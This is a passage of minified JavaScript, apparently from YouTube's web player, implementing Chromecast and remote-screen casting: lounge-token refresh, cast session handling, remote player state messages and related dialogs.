          IAb(a, b, c, d - 1);
        }, 300);
      });
    },
    t9 = function (a, b) {
      a.info("getDialAppInfoWithTimeout_ " + b);
      s9(a) && (g.TB(a.N), a.N = 0, 0 == b ? LAb(a) : a.N = g.RB(function () {
        LAb(a);
      }, b));
    },
    LAb = function (a) {
      s9(a) && a.C.getDialAppInfo(function (b) {
        a.info("getDialAppInfo dialLaunchData: " + JSON.stringify(b));
        b = b.extraData || {};
        var c = null;
        if (b.loungeToken) {
          var d;
          (null == (d = a.j) ? void 0 : d.token) == b.loungeToken && (c = "staleLoungeToken");
        } else c = "missingLoungeToken";
        c ? (a.Aa = c, t9(a, 3E4)) : (a.qa = !1, a.Aa = "unknown", vAb(a, b.loungeToken), t9(a, b.loungeTokenRefreshIntervalMs));
      }, function (b) {
        a.info("getDialAppInfo error: " + b);
        a.Aa = "noLoungeTokenResponse";
        t9(a, 3E4);
      });
    },
    MAb = function (a) {
      g.TB(a.K);
      a.K = 0;
      g.TB(a.N);
      a.N = 0;
      a.G();
      a.G = function () {};
      g.TB(a.Y);
    },
    u9 = function (a, b) {
      n9.call(this, a, b, "ManualSession");
      this.C = g.RB((0, g.fb)(this.Yz, this, null), 150);
    },
    v9 = function (a, b) {
      g.TF.call(this);
      this.config_ = b;
      this.B = a;
      this.Z = b.appId || "233637DE";
      this.D = b.theme || "cl";
      this.Y = b.disableCastApi || !1;
      this.K = b.forceMirroring || !1;
      this.j = null;
      this.N = !1;
      this.C = [];
      this.G = (0, g.fb)(this.U9, this);
    },
    NAb = function (a, b) {
      return b ? g.zb(a.C, function (c) {
        return f8(b, c.label);
      }, a) : null;
    },
    w9 = function (a) {
      b9("Controller", a);
    },
    Wzb = function (a) {
      window.chrome && chrome.cast && chrome.cast.logMessage && chrome.cast.logMessage(a);
    },
    x9 = function (a) {
      return a.N || !!a.C.length || !!a.j;
    },
    y9 = function (a, b, c) {
      b != a.j && (g.sb(a.j), (a.j = b) ? (c ? a.oa("yt-remote-cast2-receiver-resumed", b.B) : a.oa("yt-remote-cast2-receiver-selected", b.B), b.subscribe("sessionScreen", (0, g.fb)(a.kZ, a, b)), b.subscribe("sessionFailed", function () {
        return OAb(a, b);
      }), b.j ? a.oa("yt-remote-cast2-session-change", b.j) : c && a.j.Yz(null)) : a.oa("yt-remote-cast2-session-change", null));
    },
    OAb = function (a, b) {
      a.j == b && a.oa("yt-remote-cast2-session-failed");
    },
    PAb = function (a) {
      var b = a.B.uT(),
        c = a.j && a.j.B;
      a = g.lr(b, function (d) {
        c && f8(d, c.label) && (c = null);
        var e = d.uuid ? d.uuid : d.id,
          f = NAb(this, d);
        f ? (f.label = e, f.friendlyName = d.name) : (f = new chrome.cast.Receiver(e, d.name), f.receiverType = chrome.cast.ReceiverType.CUSTOM);
        return f;
      }, a);
      c && (c.receiverType != chrome.cast.ReceiverType.CUSTOM && (c = new chrome.cast.Receiver(c.label, c.friendlyName), c.receiverType = chrome.cast.ReceiverType.CUSTOM), a.push(c));
      return a;
    },
    WAb = function (a, b, c, d) {
      d.disableCastApi ? z9("Cannot initialize because disabled by Mdx config.") : QAb() ? RAb(b, d) && (SAb(!0), window.chrome && chrome.cast && chrome.cast.isAvailable ? TAb(a, c) : (window.__onGCastApiAvailable = function (e, f) {
        e ? TAb(a, c) : (A9("Failed to load cast API: " + f), UAb(!1), SAb(!1), g.PC("yt-remote-cast-available"), g.PC("yt-remote-cast-receiver"), VAb(), c(!1));
      }, d.loadCastApiSetupScript ? g.ssa("https://www.gstatic.com/cv/js/sender/v1/cast_sender.js") : 0 <= window.navigator.userAgent.indexOf("Android") && 0 <= window.navigator.userAgent.indexOf("Chrome/") && window.navigator.presentation ? 60 <= Sxb() && ayb() : !window.chrome || !window.navigator.presentation || 0 <= window.navigator.userAgent.indexOf("Edge") ? Wxb() : 89 <= Sxb() ? cyb() : ($xb(), o8(byb.map(Xxb))))) : z9("Cannot initialize because not running Chrome");
    },
    VAb = function () {
      z9("dispose");
      var a = B9();
      a && a.dispose();
      g.Sa("yt.mdx.remote.cloudview.instance_", null);
      XAb(!1);
      g.DE(YAb);
      YAb.length = 0;
    },
    C9 = function () {
      return !!g.OC("yt-remote-cast-installed");
    },
    ZAb = function () {
      var a = g.OC("yt-remote-cast-receiver");
      return a ? a.friendlyName : null;
    },
    $Ab = function () {
      z9("clearCurrentReceiver");
      g.PC("yt-remote-cast-receiver");
    },
    aBb = function () {
      return C9() ? B9() ? B9().getCastSession() : (A9("getCastSelector: Cast is not initialized."), null) : (A9("getCastSelector: Cast API is not installed!"), null);
    },
    bBb = function () {
      C9() ? B9() ? D9() ? (z9("Requesting cast selector."), B9().requestSession()) : (z9("Wait for cast API to be ready to request the session."), YAb.push(g.CE("yt-remote-cast2-api-ready", bBb))) : A9("requestCastSelector: Cast is not initialized.") : A9("requestCastSelector: Cast API is not installed!");
    },
    E9 = function (a, b) {
      D9() ? B9().setConnectedScreenStatus(a, b) : A9("setConnectedScreenStatus called before ready.");
    },
    QAb = function () {
      var a = 0 <= g.oc().search(/ (CrMo|Chrome|CriOS)\//);
      return g.cL || a;
    },
    cBb = function (a, b) {
      B9().init(a, b);
    },
    RAb = function (a, b) {
      var c = !1;
      B9() || (a = new v9(a, b), a.subscribe("yt-remote-cast2-availability-change", function (d) {
        g.NC("yt-remote-cast-available", d);
        m8("yt-remote-cast2-availability-change", d);
      }), a.subscribe("yt-remote-cast2-receiver-selected", function (d) {
        z9("onReceiverSelected: " + d.friendlyName);
        g.NC("yt-remote-cast-receiver", d);
        m8("yt-remote-cast2-receiver-selected", d);
      }), a.subscribe("yt-remote-cast2-receiver-resumed", function (d) {
        z9("onReceiverResumed: " + d.friendlyName);
        g.NC("yt-remote-cast-receiver", d);
        m8("yt-remote-cast2-receiver-resumed", d);
      }), a.subscribe("yt-remote-cast2-session-change", function (d) {
        z9("onSessionChange: " + g8(d));
        d || g.PC("yt-remote-cast-receiver");
        m8("yt-remote-cast2-session-change", d);
      }), g.Sa("yt.mdx.remote.cloudview.instance_", a), c = !0);
      z9("cloudview.createSingleton_: " + c);
      return c;
    },
    B9 = function () {
      return g.Ta("yt.mdx.remote.cloudview.instance_");
    },
    TAb = function (a, b) {
      UAb(!0);
      SAb(!1);
      cBb(a, function (c) {
        c ? (XAb(!0), g.EE("yt-remote-cast2-api-ready")) : (A9("Failed to initialize cast API."), UAb(!1), g.PC("yt-remote-cast-available"), g.PC("yt-remote-cast-receiver"), VAb());
        b(c);
      });
    },
    z9 = function (a) {
      b9("cloudview", a);
    },
    A9 = function (a) {
      b9("cloudview", a);
    },
    UAb = function (a) {
      z9("setCastInstalled_ " + a);
      g.NC("yt-remote-cast-installed", a);
    },
    D9 = function () {
      return !!g.Ta("yt.mdx.remote.cloudview.apiReady_");
    },
    XAb = function (a) {
      z9("setApiReady_ " + a);
      g.Sa("yt.mdx.remote.cloudview.apiReady_", a);
    },
    SAb = function (a) {
      g.Sa("yt.mdx.remote.cloudview.initializing_", a);
    },
    F9 = function (a) {
      this.index = -1;
      this.videoId = this.listId = "";
      this.volume = this.playerState = -1;
      this.muted = !1;
      this.audioTrackId = null;
      this.K = this.N = 0;
      this.trackData = null;
      this.Rk = this.Cp = !1;
      this.Z = this.G = this.j = this.D = 0;
      this.C = NaN;
      this.B = !1;
      this.reset(a);
    },
    dBb = function (a) {
      a.audioTrackId = null;
      a.trackData = null;
      a.playerState = -1;
      a.Cp = !1;
      a.Rk = !1;
      a.N = 0;
      a.K = g.kb();
      a.D = 0;
      a.j = 0;
      a.G = 0;
      a.Z = 0;
      a.C = NaN;
      a.B = !1;
    },
    G9 = function (a) {
      return a.isPlaying() ? (g.kb() - a.K) / 1E3 : 0;
    },
    H9 = function (a, b) {
      a.N = b;
      a.K = g.kb();
    },
    I9 = function (a) {
      switch (a.playerState) {
        case 1:
        case 1081:
          return (g.kb() - a.K) / 1E3 + a.N;
        case -1E3:
          return 0;
      }
      return a.N;
    },
    J9 = function (a, b, c) {
      var d = a.videoId;
      a.videoId = b;
      a.index = c;
      b != d && dBb(a);
    },
    eBb = function (a) {
      var b = {};
      b.index = a.index;
      b.listId = a.listId;
      b.videoId = a.videoId;
      b.playerState = a.playerState;
      b.volume = a.volume;
      b.muted = a.muted;
      b.audioTrackId = a.audioTrackId;
      b.trackData = g.rd(a.trackData);
      b.hasPrevious = a.Cp;
      b.hasNext = a.Rk;
      b.playerTime = a.N;
      b.playerTimeAt = a.K;
      b.seekableStart = a.D;
      b.seekableEnd = a.j;
      b.duration = a.G;
      b.loadedTime = a.Z;
      b.liveIngestionTime = a.C;
      return b;
    },
    L9 = function (a, b) {
      g.TF.call(this);
      this.C = 0;
      this.D = a;
      this.K = [];
      this.G = new Jzb();
      this.B = this.j = null;
      this.Y = (0, g.fb)(this.J8, this);
      this.N = (0, g.fb)(this.yE, this);
      this.Z = (0, g.fb)(this.I8, this);
      this.ma = (0, g.fb)(this.M8, this);
      var c = 0;
      a ? (c = a.getProxyState(), 3 != c && (a.subscribe("proxyStateChange", this.KR, this), fBb(this))) : c = 3;
      0 != c && (b ? this.KR(c) : g.RB((0, g.fb)(function () {
        this.KR(c);
      }, this), 0));
      (a = aBb()) && K9(this, a);
      this.subscribe("yt-remote-cast2-session-change", this.ma);
    },
    M9 = function (a) {
      return new F9(a.D.getPlayerContextData());
    },
    fBb = function (a) {
      g.cc("nowAutoplaying autoplayDismissed remotePlayerChange remoteQueueChange autoplayModeChange autoplayUpNext previousNextChange multiStateLoopEnabled loopModeChange".split(" "), function (b) {
        this.K.push(this.D.subscribe(b, g.gb(this.S9, b), this));
      }, a);
    },
    gBb = function (a) {
      g.cc(a.K, function (b) {
        this.D.unsubscribeByKey(b);
      }, a);
      a.K.length = 0;
    },
    N9 = function (a) {
      return 1 == a.getState();
    },
    O9 = function (a, b) {
      var c = a.G;
      50 > c.j.length + c.B.length && a.G.B.push(b);
    },
    hBb = function (a, b, c) {
      var d = M9(a);
      H9(d, c);
      -1E3 != d.playerState && (d.playerState = b);
      P9(a, d);
    },
    Q9 = function (a, b, c) {
      a.D.sendMessage(b, c);
    },
    P9 = function (a, b) {
      gBb(a);
      a.D.setPlayerContextData(eBb(b));
      fBb(a);
    },
    K9 = function (a, b) {
      a.B && (a.B.removeUpdateListener(a.Y), a.B.removeMediaListener(a.N), a.yE(null));
      a.B = b;
      a.B && (c9("Setting cast session: " + a.B.sessionId), a.B.addUpdateListener(a.Y), a.B.addMediaListener(a.N), a.B.media.length && a.yE(a.B.media[0]));
    },
    iBb = function (a) {
      var b = a.j.media,
        c = a.j.customData;
      if (b && c) {
        var d = M9(a);
        b.contentId != d.videoId && c9("Cast changing video to: " + b.contentId);
        d.videoId = b.contentId;
        d.playerState = c.playerState;
        H9(d, a.j.getEstimatedTime());
        P9(a, d);
      } else c9("No cast media video. Ignoring state update.");
    },
    R9 = function (a, b, c) {
      return (0, g.fb)(function (d) {
        this.dg("Failed to " + b + " with cast v2 channel. Error code: " + d.code);
        d.code != chrome.cast.ErrorCode.TIMEOUT && (this.dg("Retrying " + b + " using MDx browser channel."), Q9(this, b, c));
      }, a);
    },
    U9 = function (a, b, c, d) {
      d = void 0 === d ? !1 : d;
      g.TF.call(this);
      var e = this;
      this.K = NaN;
      this.Ea = !1;
      this.Y = this.Z = this.qa = this.Aa = NaN;
      this.ma = [];
      this.G = this.N = this.D = this.j = this.B = null;
      this.Na = a;
      this.Ka = d;
      this.ma.push(g.EC(window, "beforeunload", function () {
        e.jz(2);
      }));
      this.C = [];
      this.j = new F9();
      this.Sa = b.id;
      this.Fa = b.idType;
      this.B = Vzb(this.Na, c, this.zT, "shortLived" == this.Fa, this.Sa);
      this.B.Ta("channelOpened", function () {
        jBb(e);
      });
      this.B.Ta("channelClosed", function () {
        S9("Channel closed");
        isNaN(e.K) ? k8(!0) : k8();
        e.dispose();
      });
      this.B.Ta("channelError", function (f) {
        k8();
        isNaN(e.ED()) ? (1 == f && "shortLived" == e.Fa && e.oa("browserChannelAuthError", f), S9("Channel error: " + f + " without reconnection"), e.dispose()) : (e.Ea = !0, S9("Channel error: " + f + " with reconnection in " + e.ED() + " ms"), T9(e, 2));
      });
      this.B.Ta("channelMessage", function (f) {
        kBb(e, f);
      });
      this.B.Jr(b.token);
      this.subscribe("remoteQueueChange", function () {
        var f = e.j.videoId;
        g.QC() && g.NC("yt-remote-session-video-id", f);
      });
    },
    lBb = function (a) {
      return g.zb(a.C, function (b) {
        return "LOUNGE_SCREEN" == b.type;
      });
    },
    S9 = function (a) {
      b9("conn", a);
    },
    T9 = function (a, b) {
      a.oa("proxyStateChange", b);
    },
    mBb = function (a) {
      a.K = g.RB(function () {
        S9("Connecting timeout");
        a.jz(1);
      }, 2E4);
    },
    nBb = function (a) {
      g.TB(a.K);
      a.K = NaN;
    },
    oBb = function (a) {
      g.TB(a.Aa);
      a.Aa = NaN;
    },
    qBb = function (a) {
      pBb(a);
      a.qa = g.RB(function () {
        V9(a, "getNowPlaying");
      }, 2E4);
    },
    pBb = function (a) {
      g.TB(a.qa);
      a.qa = NaN;
    },
    jBb = function (a) {
      S9("Channel opened");
      a.Ea && (a.Ea = !1, oBb(a), a.Aa = g.RB(function () {
        S9("Timing out waiting for a screen.");
        a.jz(1);
      }, 15E3));
    },
    sBb = function (a, b) {
      var c = null;
      if (b) {
        var d = lBb(a);
        d && (c = {
          clientName: d.clientName,
          deviceMake: d.brand,
          deviceModel: d.model,
          osVersion: d.osVersion
        });
      }
      g.Sa("yt.mdx.remote.remoteClient_", c);
      b && (nBb(a), oBb(a));
      c = a.B.Mz() && isNaN(a.K);
      b == c ? b && (T9(a, 1), V9(a, "getSubtitlesTrack")) : b ? (a.DW() && a.j.reset(), T9(a, 1), V9(a, "getNowPlaying"), rBb(a)) : a.jz(1);
    },
    tBb = function (a, b) {
      var c = b.params.videoId;
      delete b.params.videoId;
      c == a.j.videoId && (g.jd(b.params) ? a.j.trackData = null : a.j.trackData = b.params, a.oa("remotePlayerChange"));
    },
    uBb = function (a, b, c) {
      var d = b.params.videoId || b.params.video_id,
        e = parseInt(b.params.currentIndex, 10);
      a.j.listId = b.params.listId || a.j.listId;
      J9(a.j, d, e);
      a.oa("remoteQueueChange", c);
    },
    wBb = function (a, b) {
      b.params = b.params || {};
      uBb(a, b, "NOW_PLAYING_MAY_CHANGE");
      vBb(a, b);
      a.oa("autoplayDismissed");
    },
    vBb = function (a, b) {
      var c = parseInt(b.params.currentTime || b.params.current_time, 10);
      H9(a.j, isNaN(c) ? 0 : c);
      c = parseInt(b.params.state, 10);
      c = isNaN(c) ? -1 : c;
      -1 == c && -1E3 == a.j.playerState && (c = -1E3);
      a.j.playerState = c;
      c = Number(b.params.loadedTime);
      a.j.Z = isNaN(c) ? 0 : c;
      a.j.zl(Number(b.params.duration));
      c = a.j;
      var d = Number(b.params.liveIngestionTime);
      c.C = d;
      c.B = isNaN(d) ? !1 : !0;
      c = a.j;
      d = Number(b.params.seekableStartTime);
      b = Number(b.params.seekableEndTime);
      c.D = isNaN(d) ? 0 : d;
      c.j = isNaN(b) ? 0 : b;
      1 == a.j.playerState ? qBb(a) : pBb(a);
      a.oa("remotePlayerChange");
    },
    xBb = function (a, b) {
      if (-1E3 != a.j.playerState) {
        var c = 1085;
        switch (parseInt(b.params.adState, 10)) {
          case 1:
            c = 1081;
            break;
          case 2:
            c = 1084;
            break;
          case 0:
            c = 1083;
        }
        a.j.playerState = c;
        b = parseInt(b.params.currentTime, 10);
        H9(a.j, isNaN(b) ? 0 : b);
        a.oa("remotePlayerChange");
      }
    },
    yBb = function (a, b) {
      var c = "true" == b.params.muted;
      a.j.volume = parseInt(b.params.volume, 10);
      a.j.muted = c;
      a.oa("remotePlayerChange");
    },
    zBb = function (a, b) {
      a.N = b.params.videoId;
      a.oa("nowAutoplaying", parseInt(b.params.timeout, 10));
    },
    ABb = function (a, b) {
      a.N = b.params.videoId || null;
      a.oa("autoplayUpNext", a.N);
    },
    BBb = function (a, b) {
      a.G = b.params.autoplayMode;
      a.oa("autoplayModeChange", a.G);
      "DISABLED" == a.G && a.oa("autoplayDismissed");
    },
    CBb = function (a, b) {
      var c = "true" == b.params.hasNext;
      a.j.Cp = "true" == b.params.hasPrevious;
      a.j.Rk = c;
      a.oa("previousNextChange");
    },
    kBb = function (a, b) {
      b = b.message;
      b.params ? S9("Received: action=" + b.action + ", params=" + g.Mm(b.params)) : S9("Received: action=" + b.action + " {}");
      switch (b.action) {
        case "loungeStatus":
          b = b8(b.params.devices);
          a.C = g.lr(b, function (d) {
            return new d8(d);
          });
          b = !!g.zb(a.C, function (d) {
            return "LOUNGE_SCREEN" == d.type;
          });
          sBb(a, b);
          b = a.CX("mlm");
          a.oa("multiStateLoopEnabled", b);
          break;
        case "loungeScreenDisconnected":
          g.Gb(a.C, function (d) {
            return "LOUNGE_SCREEN" == d.type;
          });
          sBb(a, !1);
          break;
        case "remoteConnected":
          var c = new d8(b8(b.params.device));
          g.zb(a.C, function (d) {
            return d.equals(c);
          }) || fxb(a.C, c);
          break;
        case "remoteDisconnected":
          c = new d8(b8(b.params.device));
          g.Gb(a.C, function (d) {
            return d.equals(c);
          });
          break;
        case "gracefulDisconnect":
          break;
        case "playlistModified":
          uBb(a, b, "QUEUE_MODIFIED");
          break;
        case "nowPlaying":
          wBb(a, b);
          break;
        case "onStateChange":
          vBb(a, b);
          break;
        case "onAdStateChange":
          xBb(a, b);
          break;
        case "onVolumeChanged":
          yBb(a, b);
          break;
        case "onSubtitlesTrackChanged":
          tBb(a, b);
          break;
        case "nowAutoplaying":
          zBb(a, b);
          break;
        case "autoplayDismissed":
          a.oa("autoplayDismissed");
          break;
        case "autoplayUpNext":
          ABb(a, b);
          break;
        case "onAutoplayModeChanged":
          BBb(a, b);
          break;
        case "onHasPreviousNextChanged":
          CBb(a, b);
          break;
        case "requestAssistedSignIn":
          a.oa("assistedSignInRequested", b.params.authCode);
          break;
        case "onLoopModeChanged":
          a.oa("loopModeChange", b.params.loopMode);
          break;
        default:
          S9("Unrecognized action: " + b.action);
      }
    },
    rBb = function (a) {
      g.TB(a.Y);
      a.Y = g.RB(function () {
        a.jz(1);
      }, 864E5);
    },
    V9 = function (a, b, c) {
      c ? S9("Sending: action=" + b + ", params=" + g.Mm(c)) : S9("Sending: action=" + b);
      a.B.sendMessage(b, c);
    },
    DBb = function (a) {
      g9.call(this, "ScreenServiceProxy");
      this.dh = a;
      this.j = [];
      this.j.push(this.dh.$_s("screenChange", (0, g.fb)(this.N2, this)));
      this.j.push(this.dh.$_s("onlineScreenChange", (0, g.fb)(this.A9, this)));
    },
    IBb = function (a, b) {
      Pxb();
      if (!l8 || !l8.get("yt-remote-disable-remote-module-for-dev")) {
        b = g.yB("MDX_CONFIG") || b;
        Gxb();
        Kxb();
        W9 || (W9 = new Z8(b ? b.loungeApiHost : void 0), Qxb() && (W9.j = "/api/loungedev"));
        X9 || (X9 = g.Ta("yt.mdx.remote.deferredProxies_") || [], g.Sa("yt.mdx.remote.deferredProxies_", X9));
        EBb();
        var c = Y9();
        if (!c) {
          var d = new l9(W9, b ? b.disableAutomaticScreenCache || !1 : !1);
          g.Sa("yt.mdx.remote.screenService_", d);
          c = Y9();
          var e = {};
          b && (e = {
            appId: b.appId,
            disableDial: b.disableDial,
            theme: b.theme,
            loadCastApiSetupScript: b.loadCastApiSetupScript,
            disableCastApi: b.disableCastApi,
            enableDialLoungeToken: b.enableDialLoungeToken,
            enableCastLoungeToken: b.enableCastLoungeToken,
            forceMirroring: b.forceMirroring
          });
          g.Sa("yt.mdx.remote.enableConnectWithInitialState_", b ? b.enableConnectWithInitialState || !1 : !1);
          WAb(a, d, function (f) {
            f ? Z9() && E9(Z9(), "YouTube TV") : d.subscribe("onlineScreenChange", function () {
              m8("yt-remote-receiver-availability-change");
            });
          }, e);
        }
        b && !g.Ta("yt.mdx.remote.initialized_") && (g.Sa("yt.mdx.remote.initialized_", !0), $9("Initializing: " + g.Mm(b)), a$.push(g.CE("yt-remote-cast2-api-ready", function () {
          m8("yt-remote-api-ready");
        })), a$.push(g.CE("yt-remote-cast2-availability-change", function () {
          m8("yt-remote-receiver-availability-change");
        })), a$.push(g.CE("yt-remote-cast2-receiver-selected", function () {
          b$(null);
          m8("yt-remote-auto-connect", "cast-selector-receiver");
        })), a$.push(g.CE("yt-remote-cast2-receiver-resumed", function () {
          m8("yt-remote-receiver-resumed", "cast-selector-receiver");
        })), a$.push(g.CE("yt-remote-cast2-session-change", FBb)), a$.push(g.CE("yt-remote-connection-change", function (f) {
          f ? E9(Z9(), "YouTube TV") : c$() || (E9(null, null), $Ab());
        })), a$.push(g.CE("yt-remote-cast2-session-failed", function () {
          m8("yt-remote-connection-failed");
        })), a = GBb(), b.isAuto && (a.id += "#dial"), e = b.capabilities || [], g.AB("desktop_enable_autoplay") && e.push("atp"), 0 < e.length && (a.capabilities = e), a.name = b.device, a.app = b.app, (b = b.theme) && (a.theme = b), $9(" -- with channel params: " + g.Mm(a)), a ? (g.NC("yt-remote-session-app", a.app), g.NC("yt-remote-session-name", a.name)) : (g.PC("yt-remote-session-app"), g.PC("yt-remote-session-name")), g.Sa("yt.mdx.remote.channelParams_", a), c.start(), Z9() || HBb());
      }
    },
    JBb = function () {
      var a = Y9().dh.$_gos();
      var b = d$();
      b && e$() && (Fxb(a, b) || a.push(b));
      return Exb(a);
    },
    LBb = function () {
      var a = KBb();
      !a && C9() && ZAb() && (a = {
        key: "cast-selector-receiver",
        name: ZAb()
      });
      return a;
    },
    KBb = function () {
      var a = JBb(),
        b = d$();
      b || (b = c$());
      return g.zb(a, function (c) {
        return b && f8(b, c.key) ? !0 : !1;
      });
    },
    d$ = function () {
      var a = Z9();
      if (!a) return null;
      var b = Y9().Lk();
      return h8(b, a);
    },
    FBb = function (a) {
      $9("remote.onCastSessionChange_: " + g8(a));
      if (a) {
        var b = d$();
        if (b && b.id == a.id) {
          if (E9(b.id, "YouTube TV"), "shortLived" == a.idType && (a = a.token)) f$ && (f$.token = a), (b = e$()) && b.Jr(a);
        } else b && g$(), h$(a, 1);
      } else e$() && g$();
    },
    g$ = function () {
      D9() ? B9().stopSession() : A9("stopSession called before API ready.");
      var a = e$();
      a && (a.disconnect(1), MBb(null));
    },
    NBb = function () {
      var a = e$();
      return !!a && 3 != a.getProxyState();
    },
    $9 = function (a) {
      b9("remote", a);
    },
    Y9 = function () {
      if (!OBb) {
        var a = g.Ta("yt.mdx.remote.screenService_");
        OBb = a ? new DBb(a) : null;
      }
      return OBb;
    },
    Z9 = function () {
      return g.Ta("yt.mdx.remote.currentScreenId_");
    },
    PBb = function (a) {
      g.Sa("yt.mdx.remote.currentScreenId_", a);
    },
    QBb = function () {
      return g.Ta("yt.mdx.remote.connectData_");
    },
    b$ = function (a) {
      g.Sa("yt.mdx.remote.connectData_", a);
    },
    e$ = function () {
      return g.Ta("yt.mdx.remote.connection_");
    },
    MBb = function (a) {
      var b = e$();
      b$(null);
      a || PBb("");
      g.Sa("yt.mdx.remote.connection_", a);
      X9 && (g.cc(X9, function (c) {
        c(a);
      }), X9.length = 0);
      b && !a ? m8("yt-remote-connection-change", !1) : !b && a && m8("yt-remote-connection-change", !0);
    },
    c$ = function () {
      var a = g.QC();
      if (!a) return null;
      var b = Y9();
      if (!b) return null;
      b = b.Lk();
      return h8(b, a);
    },
    h$ = function (a, b) {
      Z9();
      d$() && d$();
      if (i$) f$ = a;else {
        PBb(a.id);
        var c = g.Ta("yt.mdx.remote.enableConnectWithInitialState_") || !1;
        a = new U9(W9, a, GBb(), c);
        a.connect(b, QBb());
        a.subscribe("beforeDisconnect", function (d) {
          m8("yt-remote-before-disconnect", d);
        });
        a.subscribe("beforeDispose", function () {
          e$() && (e$(), MBb(null));
        });
        a.subscribe("browserChannelAuthError", function () {
          var d = d$();
          d && "shortLived" == d.idType && (D9() ? B9().handleBrowserChannelAuthError() : A9("refreshLoungeToken called before API ready."));
        });
        MBb(a);
      }
    },
    HBb = function () {
      var a = c$();
      a ? ($9("Resume connection to: " + g8(a)), h$(a, 0)) : (k8(), $Ab(), $9("Skipping connecting because no session screen found."));
    },
    EBb = function () {
      var a = GBb();
      if (g.jd(a)) {
        a = j8();
        var b = g.OC("yt-remote-session-name") || "",
          c = g.OC("yt-remote-session-app") || "";
        a = {
          device: "REMOTE_CONTROL",
          id: a,
          name: b,
          app: c,
          mdxVersion: 3
        };
        a.authuser = String(g.yB("SESSION_INDEX", "0"));
        (b = g.yB("DELEGATED_SESSION_ID")) && (a.pageId = String(b));
        g.Sa("yt.mdx.remote.channelParams_", a);
      }
    },
    GBb = function () {
      return g.Ta("yt.mdx.remote.channelParams_") || {};
    },
    TBb = function (a, b, c) {
      g.J.call(this);
      var d = this;
      this.module = a;
      this.J = b;
      this.Fc = c;
      this.events = new g.IK(this);
      this.Y = this.events.T(this.J, "onVolumeChange", function (e) {
        RBb(d, e);
      });
      this.D = !1;
      this.G = new g.AL(64);
      this.j = new g.Bu(this.z_, 500, this);
      this.B = new g.Bu(this.A_, 1E3, this);
      this.N = new p8(this.nca, 0, this);
      this.C = {};
      this.Z = new g.Bu(this.t0, 1E3, this);
      this.K = new q8(this.seekTo, 1E3, this);
      g.L(this, this.events);
      this.events.T(b, "onCaptionsTrackListChanged", this.l9);
      this.events.T(b, "captionschanged", this.G8);
      this.events.T(b, "captionssettingschanged", this.J_);
      this.events.T(b, "videoplayerreset", this.HJ);
      this.events.T(b, "mdxautoplaycancel", function () {
        d.Fc.RV();
      });
      b.L("enable_mdx_video_play_directly") && this.events.T(b, "videodatachange", function () {
        SBb(d.module) || j$(d) || k$(d, 0);
      });
      a = this.Fc;
      a.isDisposed();
      a.subscribe("proxyStateChange", this.hZ, this);
      a.subscribe("remotePlayerChange", this.EE, this);
      a.subscribe("remoteQueueChange", this.HJ, this);
      a.subscribe("previousNextChange", this.eZ, this);
      a.subscribe("nowAutoplaying", this.ZY, this);
      a.subscribe("autoplayDismissed", this.EY, this);
      g.L(this, this.j);
      g.L(this, this.B);
      g.L(this, this.N);
      g.L(this, this.Z);
      g.L(this, this.K);
      this.J_();
      this.HJ();
      this.EE();
    },
    RBb = function (a, b) {
      if (j$(a)) {
        a.Fc.unsubscribe("remotePlayerChange", a.EE, a);
        var c = Math.round(b.volume);
        b = !!b.muted;
        var d = M9(a.Fc);
        if (c !== d.volume || b !== d.muted) a.Fc.setVolume(c, b), a.Z.start();
        a.Fc.subscribe("remotePlayerChange", a.EE, a);
      }
    },
    UBb = function (a) {
      a.Gc(0);
      a.j.stop();
      a.xc(new g.AL(64));
    },
    VBb = function (a, b) {
      if (j$(a) && !a.D) {
        var c = null;
        b && (c = {
          style: a.J.getSubtitlesUserSettings()
        }, g.sd(c, b));
        a.Fc.yT(a.J.getVideoData(1).videoId, c);
        a.C = M9(a.Fc).trackData;
      }
    },
    k$ = function (a, b) {
      var c = a.J.getPlaylist();
      if (null == c ? 0 : c.listId) {
        var d = c.index;
        var e = c.listId.toString();
      }
      c = a.J.getVideoData(1);
      a.Fc.playVideo(c.videoId, b, d, e, c.playerParams, c.Aa, exb(c));
      a.xc(new g.AL(1));
    },
    WBb = function (a, b) {
      if (b) {
        var c = a.J.getOption("captions", "tracklist", {
          qX: 1
        });
        c && c.length ? (a.J.setOption("captions", "track", b), a.D = !1) : (a.J.loadModule("captions"), a.D = !0);
      } else a.J.setOption("captions", "track", {});
    },
    j$ = function (a) {
      return M9(a.Fc).videoId === a.J.getVideoData(1).videoId;
    },
    l$ = function () {
      g.V.call(this, {
        I: "div",
        S: "ytp-mdx-popup-dialog",
        X: {
          role: "dialog"
        },
        V: [{
          I: "div",
          S: "ytp-mdx-popup-dialog-inner-content",
          V: [{
            I: "div",
            S: "ytp-mdx-popup-title",
            xa: "You're signed out"
          }, {
            I: "div",
            S: "ytp-mdx-popup-description",
            xa: "Videos you watch may be added to the TV's watch history and influence TV recommendations. To avoid this, cancel and sign in to YouTube on your computer."
          }, {
            I: "div",
            S: "ytp-mdx-privacy-popup-buttons",
            V: [{
              I: "button",
              Ma: ["ytp-button", "ytp-mdx-privacy-popup-cancel"],
              xa: "Cancel"
            }, {
              I: "button",
              Ma: ["ytp-button", "ytp-mdx-privacy-popup-confirm"],
              xa: "Confirm"
            }]
          }]
        }]
      });
      this.j = new g.CG(this, 250);
      this.cancelButton = this.Ga("ytp-mdx-privacy-popup-cancel");
      this.confirmButton = this.Ga("ytp-mdx-privacy-popup-confirm");
      g.L(this, this.j);
      this.T(this.cancelButton, "click", this.B);
      this.T(this.confirmButton, "click", this.C);
    },
    m$ = function (a) {
      g.V.call(this, {
        I: "div",
        S: "ytp-remote",
        V: [{
          I: "div",
          S: "ytp-remote-display-status",
          V: [{
            I: "div",
            S: "ytp-remote-display-status-icon",
            V: [g.sva()]
          }, {
            I: "div",
            S: "ytp-remote-display-status-text",
            xa: "{{statustext}}"
          }]
        }]
      });
      this.api = a;
      this.j = new g.CG(this, 250);
      g.L(this, this.j);
      this.T(a, "presentingplayerstatechange", this.onStateChange);
      this.Dc(a.Qb());
    },
    n$ = function (a, b) {
      g.xX.call(this, "Play on", 1, a, b);
      this.J = a;
      this.Zt = {};
      this.T(a, "onMdxReceiversChange", this.D);
      this.T(a, "presentingplayerstatechange", this.D);
      this.D();
    },
    XBb = function (a) {
      g.wV.call(this, a);
      this.Np = {
        key: Dxb(),
        name: "This computer"
      };
      this.Sl = null;
      this.subscriptions = [];
      this.QQ = this.Fc = null;
      this.Zt = [this.Np];
      this.Ms = this.Np;
      this.gf = new g.AL(64);
      this.LX = 0;
      this.Nh = -1;
      this.YE = !1;
      this.WE = this.aB = null;
      if (!g.dS(this.player.U()) && !g.ZG(this.player.U())) {
